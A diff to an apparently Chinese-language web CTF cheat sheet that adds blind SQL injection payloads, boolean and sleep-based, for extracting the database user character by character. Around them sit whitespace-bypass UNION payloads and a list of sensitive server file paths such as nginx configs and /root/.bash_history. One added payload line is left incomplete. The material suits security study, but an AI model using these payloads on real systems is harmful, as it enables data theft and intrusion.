@@ -892,10 +892,13 @@ pop graphic-context
         - 「有」跟「沒有」
         - `id=87 and length(user())>0`
         - `id=87 and length(user())>100`
+        - `id=87 and ascii(mid(user(),1,1))>100`
+        - `id=87 or ((select user()) regexp binary
     - Time
         - 用在啥結果都看不到時
         - `id=87 and if(length(user())>0, sleep(10), 1)=1`
         - `id=87 and if(length(user())>100, sleep(10), 1)=1`
+        - `id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1`
 - 繞過空白檢查
     - `id=-1/**/UNION/**/SELECT/**/1,2,3`
     - `id=-1%09UNION%0DSELECT%0A1,2,3`
@@ -1316,6 +1319,7 @@ HQL injection example (pwn2win 2017)
 - `/usr/local/etc/apache2/httpd.conf`
 - `/etc/nginx/conf.d/default.conf`
 - `/etc/nginx/nginx.conf`
+- `/etc/nginx/sites-enabled/default`
 - `/etc/nginx/sites-enabled/default.conf`
 - `.htaccess`
 - `/root/.bash_history`
